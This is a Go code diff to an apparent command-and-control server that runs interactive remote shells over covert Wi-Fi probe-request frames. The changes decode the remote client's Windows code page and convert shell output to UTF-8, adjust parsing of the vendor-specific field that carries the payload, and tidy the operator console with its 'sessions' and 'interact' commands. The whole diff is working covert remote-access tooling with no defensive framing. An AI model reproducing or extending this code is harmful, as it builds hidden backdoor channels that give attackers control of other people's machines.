@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"encoding/binary"
 	"fmt"
 	"log"
 	"math/rand"
@@ -12,6 +13,7 @@ import (
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
+	iconv "gopkg.in/iconv.v1"
 )
 
 var err error
@@ -26,6 +28,7 @@ type GHServer struct {
 	bcn         *TunnelData
 	curCltID    uint8
 	curOptCltID uint8
+	curCltACP   string
 	clients     map[string]*clientSession
 }
 
@@ -162,11 +165,24 @@ func (s *GHServer) handleConn() {
 func (s *GHServer) handleShell() {
 	switch s.pr.dataType {
 	case TunnelShellData:
-		fmt.Print(s.pr.payload)
+		cd, _ := iconv.Open("utf-8", s.curCltACP) // convert utf-8 to gbk
+		defer cd.Close()
+
+		ret := cd.ConvString(s.pr.payload)
+		fmt.Print(ret)
 		break
-	case TunnelShellAcp:
+
+	case TunnelShellACP:
 		fmt.Printf("[*] Shell from Client %d is ready\n", s.curOptCltID)
+		acp := []byte(s.pr.payload)
+
+		for i := len(acp)/2 - 1; i >= 0; i-- {
+			opp := len(acp) - 1 - i
+			acp[i], acp[opp] = acp[opp], acp[i]
+		}
+		s.curCltACP = fmt.Sprintf("CP%d", binary.BigEndian.Uint32([]byte(string(acp))))
 		break
+
 	default:
 		break
 	}
@@ -231,7 +247,7 @@ func parseProbeReq(probeLayer *layers.Dot11MgmtProbeReq) *TunnelData {
 			for i := uint64(6 + t.length); i < uint64(len(body)); i++ {
 				if layers.Dot11InformationElementID(body[i]) == layers.Dot11InformationElementIDVendor {
 					// only save the last vendor specific field
-					p2 = string(body[i+1:])
+					p2 = string(body[i+2:])
 				}
 			}
 		}
@@ -307,7 +323,6 @@ func (s *GHServer) handleConsole() {
 	stdin := bufio.NewReader(os.Stdin)
 	for {
 		fmt.Print("Cmd-> ")
-
 		var cmd string
 		var param string
 
@@ -317,6 +332,7 @@ func (s *GHServer) handleConsole() {
 		switch cmd {
 		case "sessions":
 			s.showSessions()
+
 		case "interact":
 			id, err := strconv.Atoi(param)
 			if err != nil {
@@ -324,10 +340,16 @@ func (s *GHServer) handleConsole() {
 				break
 			}
 			s.interact(uint8(id))
+
 		case "help":
 			s.showHelp()
+
+		case "":
+			break
+
 		case "exit":
 			os.Exit(0)
+
 		default:
 			fmt.Println("[!] I don't understand")
 		}
@@ -402,7 +424,7 @@ const (
 const (
 	TunnelShell uint8 = iota + 0x20
 	TunnelShellInit
-	TunnelShellAcp
+	TunnelShellACP
 	TunnelShellData
 	TunnelShellQuit
 )
